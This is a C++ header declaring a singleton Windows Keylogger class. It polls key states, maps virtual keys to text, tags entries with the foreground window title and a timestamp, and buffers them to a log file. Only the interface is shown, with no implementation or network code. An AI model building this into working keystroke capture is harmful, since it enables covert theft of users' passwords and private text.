#pragma once

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>

class Keylogger {
public:
    static Keylogger& get();

    void start();
    void stop();
    void setLogFile(const wchar_t* logFilePath);
    void clearLog();
    const wchar_t* getLog();
    const wchar_t* getBuffer();
    bool isRunning();
    void flushBuffer(const wchar_t* logPath);
    void clearBuffer();
    int getBufferSize();

    Keylogger(const Keylogger&) = delete;
    Keylogger& operator=(const Keylogger&) = delete;

private:
    Keylogger();
    ~Keylogger();

    struct LogEntry {
        std::string timestamp;
        std::wstring window;
        std::string content;
    };

    void pollingThread();
    void checkWindowChange();
    void flushToBuffer();
    std::wstring getForegroundWindowTitle();
    std::string vkToString(int vk, bool shift);
    std::string getCurrentTimestamp();

    std::wstring m_logFilePath = L"keylog.txt";
    std::wstring m_currentWindow;
    std::string m_keyBuffer;
    std::string m_lastTimestamp;
    bool m_prevKeyStates[256] = {};

    std::vector<LogEntry> m_logBuffer;
    std::mutex m_bufferMutex;
    std::atomic<bool> m_isRunning{ false };
    std::atomic<bool> m_stopFlag{ false };
    std::thread m_pollThread;
};
